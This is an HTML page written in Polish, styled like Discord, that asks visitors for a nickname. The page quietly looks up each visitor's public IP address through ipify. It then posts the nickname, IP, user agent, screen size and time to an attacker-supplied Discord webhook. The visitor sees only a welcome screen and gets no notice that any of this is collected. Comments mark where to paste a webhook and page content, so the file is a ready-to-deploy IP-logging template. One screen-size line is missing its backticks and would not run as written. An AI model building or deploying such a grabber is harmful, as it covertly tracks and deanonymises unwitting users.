<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Witaj</title>
<style>
body {
margin: 0;
padding: 0;
background-color: #121212; /* Czarne tło jak na Discordzie/typowych dark mode */
color: #ffffff;
font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
overflow: hidden;
}

.container {
background-color: #1e1e1e;
padding: 40px;
border-radius: 12px;
box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
text-align: center;
width: 300px;
}

h1 {
font-size: 24px;
margin-bottom: 20px;
font-weight: 600;
}

input {
width: 100%;
padding: 12px;
margin-bottom: 15px;
border: 1px solid #333;
border-radius: 6px;
background-color: #2c2c2c;
color: white;
font-size: 16px;
box-sizing: border-box;
outline: none;
}

input:focus {
border-color: #7289da; /* Discord blurple */
}

button {
width: 100%;
padding: 12px;
background-color: #7289da;
color: white;
border: none;
border-radius: 6px;
font-size: 16px;
cursor: pointer;
font-weight: bold;
transition: background-color 0.2s;
}

button:hover {
background-color: #5b6eae;
}

.hidden {
display: none;
}

#main-content {
text-align: center;
}

/* Prosty efekt ładowania */
.loader {
border: 3px solid #f3f3f3;
border-top: 3px solid #7289da;
border-radius: 50%;
width: 20px;
height: 20px;
animation: spin 2s linear infinite;
margin: 0 auto;
display: none;
}

@keyframes spin {
0% { transform: rotate(0deg); }
100% { transform: rotate(360deg); }
}
</style>
</head>
<body>

<!-- Sekcja logowania/nicku -->
<div class="container" id="login-section">
<h1>Wpisz swój nick</h1>
<input type="text" id="nickname" placeholder="Twój nick..." autocomplete="off">
<button id="submit-btn">Wyślij</button>
<div class="loader" id="loader"></div>
</div>

<!-- Główna zawartość (po wpisaniu nicku) -->
<div class="container hidden" id="main-content">
<h1>Witaj!</h1>
<p>Możesz teraz przeglądać stronę.</p>
<!-- Tutaj możesz wkleić treść strony, która ma się wyświetlać -->
</div>

<script>
// ==========================================
// KONFIGURACJA
// ==========================================

// Wklej tutaj swój Discord Webhook URL (Incoming Webhook)
const WEBHOOK_URL = "https://discord.com/api/webhooks/TWOJ_ID/TWÓJ_TOKEN";

// ==========================================
// LOGIKA
// ==========================================

const loginSection = document.getElementById('login-section');
const mainContent = document.getElementById('main-content');
const nickInput = document.getElementById('nickname');
const submitBtn = document.getElementById('submit-btn');
const loader = document.getElementById('loader');

// Funkcja do pobierania IP (używamy zewnętrznej usługi API)
async function getIP() {
try {
const response = await fetch('https://api.ipify.org?format=json');
const data = await response.json();
return data.ip;
} catch (error) {
return "Nieznany IP";
}
}

// Funkcja wysyłająca dane do Discorda
async function sendToDiscord(nick, ip) {
const userAgent = navigator.userAgent;
const screenRes = ${window.screen.width}x${window.screen.height};
const date = new Date().toLocaleString();

const payload = {
content: null,
embeds: [{
title: "Nowy Login / Zbiór Danych",
color: 4378198, // Discord Blurple
fields: [
{ name: "Nick", value: nick, inline: true },
{ name: "IP", value: ip, inline: true },
{ name: "User Agent", value: userAgent.substring(0, 50) + "...", inline: false },
{ name: "Ekran", value: screenRes, inline: true },
{ name: "Czas", value: date, inline: true }
],
footer: {
text: "System Monitor v1.0"
},
timestamp: new Date().toISOString()
}]
};

try {
await fetch(WEBHOOK_URL, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
});
} catch (e) {
console.error("Błąd wysyłania do Discorda", e);
}
}

// Obsługa kliknięcia
submitBtn.addEventListener('click', async () => {
const nick = nickInput.value.trim();
if (!nick) {
alert("Wpisz nick!");
return;
}

// UI Loading
submitBtn.disabled = true;
submitBtn.style.opacity = '0.5';
loader.style.display = 'block';

const ip = await getIP();

// Wyślij dane
await sendToDiscord(nick, ip);

// Przełącz widok
loginSection.classList.add('hidden');
mainContent.classList.remove('hidden');
});

// Obsługa Entera
nickInput.addEventListener('keypress', (e) => {
if (e.key === 'Enter') {
submitBtn.click();
}
});
</script>
</body>
</html>
